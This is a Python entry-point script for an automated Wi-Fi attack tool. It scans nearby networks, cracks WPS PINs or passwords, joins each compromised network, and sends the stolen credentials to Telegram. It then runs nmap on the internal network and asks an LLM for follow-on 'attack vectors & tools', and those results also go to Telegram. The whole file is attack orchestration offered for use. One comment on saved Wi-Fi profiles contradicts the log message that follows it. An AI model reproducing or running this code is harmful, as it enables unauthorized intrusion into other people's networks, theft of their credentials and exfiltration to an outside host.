import os
import time
import logging
from utils import (
    clean_files,
    setup_logging,
    is_ssh_connected
)
from wifi_scan import scan_targets
from wifi_attack import attack_target
from wifi_connect import connect_to_wifi, disconnect_all_wifi_devices
from send_to_telegram import send_message
from nmap_scan import run_nmap_scan, get_wifi_network, clean_nmap_output
from llm_analysis import get_llm_attack_insights
from runtime_guard import enforce_runtime_limit, RuntimeLimitExceeded
from constants import (
    TARGETS_FILE,
    CRACKED_FILE,
    ATTACK_INTERFACE,
    PCAP_FILE,
    STOP_ON_SUCCESS,
    MAX_RUNTIME,
    ENABLE_NMAP_SCAN
)


def run_workflow():
    # Keep the existing between-target check for a normal, logged exit. The
    # outer wall-clock guard also interrupts a stage that blocks past the limit.
    global_start_time = time.monotonic()

    # Disconnect Wi-Fi without deleting saved NetworkManager profiles.
    disconnect_all_wifi_devices()
    logging.info("Disconnected Wi-Fi and removed saved wireless profiles.")

    # Clean temp files
    clean_files(TARGETS_FILE, CRACKED_FILE, PCAP_FILE)
    logging.info("Temporary files cleaned.")

    # Scan for targets
    targets = scan_targets(ATTACK_INTERFACE)

    # Attack loop
    while targets:
        if time.monotonic() - global_start_time > MAX_RUNTIME:
            logging.warning("Max runtime exceeded. Exiting.")
            break

        target = targets.pop(0)
        essid = target["essid"]
        bssid = target["bssid"]
        power = target["power"]
        logging.info(f"Attacking {essid} (power: {power} dB)")
        result = attack_target(ATTACK_INTERFACE, essid, bssid=bssid)
        if result:
            connected = connect_to_wifi(
                essid,
                bssid=bssid,
                pin=result.get("pin"),
                psk=result.get("psk"),
            )
            if connected:
                msg = f"[+]\nSSID: {essid}"
                if result.get("psk"):
                    msg += f"\nPassword: {result['psk']}"
                elif result.get("pin"):
                    msg += f"\nWPS PIN: {result['pin']}"

                send_message(msg, prefix="[Wi-Fi compromised]")

                if ENABLE_NMAP_SCAN:
                    network = get_wifi_network(ATTACK_INTERFACE)
                    if network:
                        logging.info(f"Running nmap scan on internal network: {network}")
                        nmap_result = run_nmap_scan(network)
                        if nmap_result:
                            # Send raw nmap output
                            cleaned_output = clean_nmap_output(nmap_result)
                            send_message(cleaned_output, prefix="[nmap scan result]")

                            # Get LLM attack insights
                            llm_insights = get_llm_attack_insights(cleaned_output)
                            if llm_insights:
                                # Send insights with markdown formatting and chunking
                                send_message(llm_insights, prefix="[🎯 Attack Vectors & Tools]")
                                logging.info("LLM attack insights sent to Telegram")
                            else:
                                logging.info("LLM analysis not available or failed")
                    else:
                        logging.warning("No IPv4 network assigned to interface. Skipping nmap scan.")

                if STOP_ON_SUCCESS:
                    logging.info("Stopping after first successful compromise (as per config).")
                    break
            else:
                logging.warning(f"Connection to {essid} failed after PIN/PSK.")
        else:
            logging.warning(f"No credentials obtained for {essid}.")


def main():
    # Ensure logs directory exists + configure logging
    setup_logging()
    logging.info("Starting networkObserver")

    try:
        with enforce_runtime_limit(MAX_RUNTIME):
            run_workflow()
    except RuntimeLimitExceeded:
        logging.warning(
            "Hard max runtime (%ss) reached. Stopping the current stage.",
            MAX_RUNTIME,
        )

    logging.info("Process completed.")

    # Preserve the existing shutdown decision after every completed run.
    if is_ssh_connected():
        logging.info("SSH session detected. Skipping shutdown.")
    else:
        logging.info("No SSH session. Proceeding with shutdown.")
        os.system("sudo poweroff")


if __name__ == "__main__":
    main()
